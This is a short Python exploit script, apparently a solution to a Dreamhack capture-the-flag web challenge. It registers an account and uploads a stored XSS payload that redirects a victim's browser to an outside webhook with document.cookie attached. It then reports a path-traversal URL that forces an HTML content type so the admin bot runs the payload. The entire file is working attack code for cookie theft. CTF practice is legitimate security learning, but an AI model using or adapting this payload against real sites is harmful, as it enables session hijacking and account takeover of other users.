import requests
import re
import random, string

url = "http://host8.dreamhack.games:10563/"
s = requests.Session()

# login
creds = {
    'uid': 'hacked',
    'upw': 'hacked'
}

res = s.post(f"{url}/signup", data=creds)
res = s.post(f"{url}/signin", data=creds)

cookie = s.cookies['dream-token']

# xss
webhook = 'https://uljojhr.request.dreamhack.games'
payload = '''<script>location.href = `%s?e=${document.cookie}`</script>''' % webhook

res = s.post(f'{url}/user/upload', data={
    'filename': ''.join(random.sample(string.digits + string.ascii_lowercase, 5)),
    'data': payload
}, cookies={
    'dream-token': cookie
})

if "missing" not in res.text.lower():
    print("> Payload uploaded")

file_link = re.findall(r'<a href="(/file/.+?)">', res.text)[-1]
print("> Payload link:", file_link)

# report
res = s.post(f'{url}/report', data={
    'path': f'user/..%2f{file_link}?content-type=text/html'
})

if 'success' in res.text.lower():
    print("> Payload reported")